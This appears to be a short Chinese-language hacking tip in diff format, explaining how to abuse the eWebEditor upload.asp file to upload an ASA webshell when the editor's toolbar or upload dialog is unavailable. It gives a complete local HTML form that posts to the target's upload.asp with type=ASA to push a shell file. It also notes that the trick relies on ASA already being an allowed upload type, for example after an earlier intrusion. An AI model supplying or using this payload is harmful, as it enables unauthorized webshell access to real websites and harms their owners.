@@ -1,0 +1,11 @@
+还有的时候管理员不让复制样式，但是你又看到有个样式被别人以前入侵修改了存在asa或者之类可以传shell，但是上传插入工具没有，又无法修改怎么办那？也许很多人说应该可以加工具栏，但是我就遇见过不让加的
+这样我们可以利用ewebeditor里的upload.asp文件进行本地构造进行上传具体如下：
+在action下面
+<form action="http://*********/edit/upload.asp?action=save&type=ASA&style=test" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=1 style="width:100%" onchange="originalfile.value=this.value">
+<input type="submit" name="uploadfile" value="提交">
+<input type=hidden name=originalfile value="">
+</form>
+----------------------------------------------------------------------------------------------------------------------------
+<input type="submit" name="uploadfile" value="提交">    放在action后头
+，适合用于在ewebeditor后台那个预览那里出来的 比如上传图片那里，有些时候上传页面弹不出来，就可以用upload.asp?action=save&type=ASA&style=test 这个本地来提交，不过这个东西还是要数据库里上传类型有ASA才可以传得上。
